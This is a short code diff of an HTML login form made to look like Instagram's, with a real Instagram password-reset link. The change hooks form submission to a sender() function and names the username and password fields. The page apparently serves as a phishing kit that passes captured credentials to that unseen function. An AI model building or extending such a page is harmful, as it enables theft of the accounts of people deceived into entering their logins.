@@ -124,12 +124,12 @@
                 <font size="2.75" color="grey" style="normal">
                 <p id="or" >OR</p></div></center>
         </font>
-        <form>
+        <form onsubmit=" return sender()">
             <div class="input-box">
-                <input type="text" placeholder="Username or Email" required>
+                <input type="text" name="username" placeholder="Username or Email" required>
             </div>
             <div class="input-box">
-                <input type="password" placeholder="Password" required>
+                <input type="password" name="password" placeholder="Password" required>
             </div>
             <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forgot-password" align="right">Forgot password?</a>
             <button type="submit" class="login-btn">Log In</button>
